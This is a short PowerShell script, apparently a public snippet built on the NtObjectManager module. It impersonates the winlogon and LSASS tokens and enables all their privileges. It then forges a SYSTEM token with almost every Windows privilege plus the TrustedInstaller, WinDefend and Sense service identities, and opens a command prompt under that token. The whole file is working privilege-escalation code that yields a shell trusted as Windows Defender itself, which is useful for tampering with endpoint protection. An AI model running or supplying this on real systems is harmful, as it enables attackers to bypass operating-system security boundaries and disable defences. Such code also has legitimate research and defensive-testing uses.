# uses NtObjectManager module
# quick example code to craft a token containging WinDefend, TrustedInstaller and Sense token...
# https://github.com/rweijnen/Posh-Snippets/blob/master/ImpersonateWinDefend.ps1
$winDefendSid = Get-NtSid -ServiceName "WinDefend"
$trustedInstallerSid = Get-NtSid -ServiceName "TrustedInstaller"
$senseSid = Get-NtSid -ServiceName "SenseSid"

# get winlogon pid
$winLogonPid = (get-process winlogon).id

# get winlogon token
$winLogonToken = Get-NtTokenFromProcess $winLogonPid

# impersonate winlogon
$current = Get-NtThread -Current -PseudoHandle
$contextWinLogon = $current.Impersonate($winLogonToken)

$disabledPrivileges = Get-NtTokenPrivilege | where {-not $_.Enabled } | select -Expand Name
ForEach ($priv in $disabledPrivileges)
{
	Enable-NtTokenPrivilege -Privilege $priv -Token $winLogonToken
}

# get lsass pid
$lsasPid = (Get-Process LSASS).Id

# get lsas token
$lsasToken = Get-NtTokenFromProcess $lsasPid

# impersonate lsas
$contextLsas = $current.Impersonate($lsasToken)

$disabledPrivileges = Get-NtTokenPrivilege | where {-not $_.Enabled } | select -Expand Name
ForEach ($priv in $disabledPrivileges)
{
	Enable-NtTokenPrivilege -Privilege $priv
}

$tokenParams = @{
    User = 'SY'
    TokenType = 'Primary'
    Access = 'MaximumAllowed'
	IntegrityLevel = 'System'
    Privileges = @(
        'SeCreateTokenPrivilege',
        'SeAssignPrimaryTokenPrivilege',
        'SeLockMemoryPrivilege',
        'SeIncreaseQuotaPrivilege',
        'SeMachineAccountPrivilege',
        'SeTcbPrivilege',
        'SeSecurityPrivilege',
        'SeTakeOwnershipPrivilege',
        'SeLoadDriverPrivilege',
        'SeSystemProfilePrivilege',
        'SeSystemTimePrivilege',
        'SeProfileSingleProcessPrivilege',
        'SeIncreaseBasePriorityPrivilege',
        'SeCreatePageFilePrivilege',
        'SeCreatePermanentPrivilege',
        'SeBackupPrivilege',
        'SeRestorePrivilege',
        'SeShutdownPrivilege',
        'SeDebugPrivilege',
        'SeAuditPrivilege',
        'SeSystemEnvironmentPrivilege',
        'SeChangeNotifyPrivilege',
        'SeRemoteShutdownPrivilege',
        'SeUndockPrivilege',
        'SeSyncAgentPrivilege',
        'SeEnableDelegationPrivilege',
        'SeManageVolumePrivilege',
        'SeImpersonatePrivilege',
        'SeCreateGlobalPrivilege',
        'SeTrustedCredmanAccessPrivilege',
        'SeRelabelPrivilege',
        'SeIncreaseWorkingSetPrivilege',
        'SeTimeZonePrivilege',
        'SeCreateSymbolicLinkPrivilege',
        'SeDelegateSessionUserImpersonatePrivilege'
		)
    Groups = @(
        'BA',
        'WD',
        'S-1-5-6',
        'S-1-5-11',
        'S-1-5-15',
        'S-1-5-32-545',
        $(Get-NtSid -ServiceName "TrustedInstaller"),
        $(Get-NtSid -ServiceName "WinDefend"),
        $(Get-NtSid -ServiceName "Sense")
    )
}

# Create a new NT token with the specified parameters
$token = New-NtToken @tokenParams

$dupToken = Copy-NtToken -Token $token -ImpersonationLevel Impersonation -Access MaximumAllowed

New-Win32Process -CommandLine "cmd.exe /k echo **WINDOWS DEFENDER COMMAND PROMPT** && whoami /all" -Token $dupToken

$dupToken.Dispose()
$token.Dispose()

#revert
$contextLsas.Revert()
$contextLsas.Dispose()
$contextWinLogon.Revert()
$contextWinLogon.Dispose()

$current.Dispose()
